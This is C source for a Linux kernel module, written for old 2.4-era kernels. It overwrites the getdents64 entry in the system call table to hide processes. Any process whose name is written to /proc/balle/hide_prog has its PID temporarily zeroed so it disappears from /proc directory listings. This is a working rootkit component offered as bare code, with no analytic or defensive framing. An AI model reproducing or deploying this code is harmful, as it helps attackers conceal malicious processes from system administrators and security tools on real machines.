#define __KERNEL__
#define MODULE
#define PROCHOOK_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

#define PF_HIDDEN	128
#define BUFSIZE         256

int (*old_getdents)(unsigned int, void *, unsigned int);
int new_getdents(unsigned int, void *, unsigned int);

void hide_pids(void);
void show_pids(void);

int conf_read(char *, char **, off_t, int, int *, void *);
int conf_write(struct file *, const char *, unsigned long, void *);

extern void *sys_call_table[];

struct proc_dir_entry *my_dir; 
struct proc_dir_entry *conf_file;

char hide_pid[BUFSIZE];

int init_module(void)
{
  old_getdents = sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = new_getdents;
  memset(hide_pid, '\0', BUFSIZE);

  my_dir = proc_mkdir("balle", &proc_root);
  
  if(my_dir)
    {
      conf_file = create_proc_entry("hide_prog", 0600, my_dir);
      conf_file->owner = THIS_MODULE;
      conf_file->write_proc = conf_write;
      conf_file->read_proc = conf_read;
    }

  return 0;
}

void cleanup_module(void)
{
  remove_proc_entry(my_dir->name, &proc_root);
  sys_call_table[__NR_getdents64] = old_getdents;
}

int new_getdents(unsigned int fd, void *dirent, unsigned int count)
{
  int result = 0;
  struct file *file = (struct file *)fget(fd);
  struct super_block *sblock = file->f_dentry->d_sb;

  if(sblock->s_magic == PROC_SUPER_MAGIC)
    hide_pids();

  result = old_getdents(fd, dirent, count);

  if(sblock->s_magic == PROC_SUPER_MAGIC)
    show_pids();

  fput(file);
  return result;
}

void hide_pids(void)
{
  struct task_struct *task; 

  for_each_task(task) 
    {
      if((task->pid > 1) && (!strcmp(hide_pid, task->comm)))
	{
	  task->flags |= PF_HIDDEN;
	  task->exit_code = task->pid;
	  task->pid = 0;
	}
    }

  return;
}

void show_pids(void)
{
  struct task_struct *task;

  for_each_task(task) 
    {
      if(task->flags & PF_HIDDEN)
	{
	  task->flags &= ~PF_HIDDEN;
	  task->pid = task->exit_code;
	  task->exit_code = 0;
	}
    }

  return;
}

int conf_read(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
  return sprintf(buf, "%s\n", hide_pid);
}

int conf_write(struct file *file, const char *buf, unsigned long count, void *data)
{
  char *curr = hide_pid;
  memset(hide_pid, '\0', BUFSIZE);
  strncpy(hide_pid, buf, count);

  while(*curr != '\0')
    {
      if(*curr == '\n')
	*curr = '\0';

      curr++;
    }
  
  return strlen(buf);
}
